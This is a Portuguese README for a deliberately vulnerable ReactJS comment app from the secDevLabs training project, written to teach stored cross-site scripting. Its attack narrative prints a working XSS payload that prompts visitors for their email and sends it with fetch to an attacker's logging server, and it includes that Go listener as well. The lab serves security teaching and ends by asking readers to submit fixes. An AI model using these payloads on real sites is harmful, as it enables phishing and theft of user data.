# Comment-killer

<p align="center">
    <img src="images/img1.png"/></br>
    <a href="README.md"><img height="24" title="Access content in English" src="https://img.shields.io/badge/Access%20content%20in-English-blue"/></a>
</p>

O Comment-killer é um aplicativo ReactJS simples, que possui uma vulnerabilidade de injeção (XSS) e seu principal objetivo é descrever como um usuário mal-intencionado poderia explorá-lo.

## Index

- [Comment-killer](#comment-killer)
  - [Index](#index)
  - [O que é Cross Site Scripting?](#o-que-é-cross-site-scripting)
  - [Como inicializar o aplicativo?](#como-inicializar-o-aplicativo)
  - [Conheça o app 💵](#conheça-o-app-)
  - [Narrativa de ataque](#narrativa-de-ataque)
  - [Proteger este aplicativo](#proteger-este-aplicativo)
  - [PR Soluções](#pr-soluções)
  - [Contribuição](#contribuição)


## O que é Cross Site Scripting?

As falhas de XSS ocorrem sempre que um aplicativo inclui dados não confiáveis em uma nova página da Web sem validação, escape adequados, ou atualiza uma página da Web existente com dados fornecidos pelo usuário usando uma API do navegador que pode criar HTML ou JavaScript. 

O XSS permite que os invasores executem scripts no navegador da vítima que podem sequestrar sessões do usuário, desfigurar sites ou redirecionar o usuário para sites maliciosos.

O objetivo principal deste aplicativo é discutir como as vulnerabilidades de **Cross-Site Scripting** podem ser exploradas e incentivar os desenvolvedores a enviar solicitações de pull do **secDevLabs** sobre como mitigar essas falhas. Saiba mais <a href="https://owasp.org/www-community/attacks/xss/">aqui</a>.

## Como inicializar o aplicativo?

Para iniciar este aplicativo **intencionalmente inseguro**, você precisará do [Docker][Docker Install] e do [Docker Compose][Docker Compose Install]. Depois de clonar o repositório [secDevLabs](https://github.com/globocom/secDevLabs), no seu computador, você deve digitar os seguintes comandos para iniciar o aplicativo:

```bash
cd secDevLabs/owasp-top10-2021-apps/a3/comment-killer
```

```bash
make install
```

Depois é só visitar [http://localhost:10007][app] ! 😆

## Conheça o app 💵

Para entender corretamente como esse aplicativo funciona, você pode seguir esse passo a passo:

- Leia a história legal por trás dos Memes.
- Adicione um novo comentário.

## Narrativa de ataque

Agora que você conhece o propósito deste aplicativo, o que pode dar errado? A seção a seguir descreve como um invasor pode identificar e, eventualmente, encontrar informações confidenciais sobre o aplicativo ou seus usuários. Recomendamos que você siga estas etapas e tente reproduzi-las por conta própria para entender melhor o ataque! 😜

### Nota: Esta narrativa de ataque funciona melhor no Mozilla Firefox.

### 👀

### Uma página ou aplicativo da Web é vulnerável ao XSS  se a entrada do usuário permitir scripts.

Após inspecionar a aplicação, é possível identificar que a entrada de comentário está permitindo scripts e pode ser executada em um navegador web. As imagens a seguir mostram esse comportamento quando o texto a seguir é usado como entrada nesses campos: 

```
<script>alert(1)</script>
```

Adicionando um novo comentário a uma postagem:

<p align="center">
    <img src="images/img2.png"/>
</p>

A validação de entrada ausente permite que um usuário mal-intencionado insira alguns scripts que persistirão no servidor e serão executados no navegador das vítimas toda vez que acessarem as rotas que contêm esses scripts. 

#### 🔥

Um invasor pode abusar dessa falha gerando um código JS malicioso e enviando-o para outros usuários. Para demonstrar isso, o exemplo a seguir criará um formulário de email para tentar roubar as credenciais do usuário.

Inicialmente, uma API é necessária para registrar todas as solicitações recebidas e pode ser construída em Golang da seguinte forma:

```go
package main

import (
   "fmt"
   "github.com/labstack/echo"
)

func main() {
   e := echo.New()
   e.GET("/:email", handler)
   e.Logger.Fatal(e.Start(":9051"))
}

func handler(c echo.Context) error {
   fmt.Println(c.Request().RemoteAddr, c.Param("email"))
   return nil
}
```

Para iniciar a API, o seguinte comando pode ser usado (você deve verificar este [guia](https://golang.org/doc/install) se precisar de ajuda com o Golang):

```sh
go run main.go
```

Com a API em funcionamento, basta o seguinte código para mostrar uma mensagem pop-up solicitando o e-mail do usuário para continuar lendo o blog:

```js
<script>
    var email = prompt("Please input your email again to continue:", "email@example.com");

    if (email == null || email == "") {
        alert("Ooops, please refresh the page!");
    } else {
        fetch('http://localhost:9051/'+email);
    }
</script>
```

O código JavaScript acima é responsável por enviar uma solicitação `GET` para a API do invasor para que ela possa ser registrada. Neste cenário, enviaremos solicitações para `localhost`.

Tudo o que precisamos agora é colar o código JavaScript no campo de comentários, conforme mostra a imagem a seguir:

<p align="center">
    <img src="images/img3.png"/>
</p>

Quando outro usuário acessar o aplicativo, o seguinte pop-up será mostrado, como podemos ver na imagem abaixo:

<p align="center">
    <img src="images/img4.png"/>
</p>

Enquanto isso, com a API em funcionamento, podemos receber o e-mail do usuário, conforme mostra a imagem a seguir:

<p align="center">
    <img src="images/img5.png"/>
</p>

## Proteger este aplicativo

Como você arrumaria essa vulnerabilidade? Após suas alterações, um invasor não poderá:

- Executar scripts por meio de campos de entrada

<a name="Sol"></a>

## PR Soluções

[Alerta de spoiler 🚨 ] Para entender como essa vulnerabilidade pode ser resolvida, confira [esses pull requests](https://github.com/globocom/secDevLabs/pulls?q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3AComment-Killer)!

<a name="Cont"></a>

## Contribuição

Nós encorajamos você a contribuir com o SecDevLabs! Por favor, confira a seção [Contribuição no SecDevLabs](../../../docs/CONTRIBUTING.md) de como fazer a sua contribuição!🎉 🎉

[docker install]: https://docs.docker.com/install/
[docker compose install]: https://docs.docker.com/compose/install/
[app]: http://localhost:10007
[secdevlabs]: https://github.com/globocom/secDevLabs
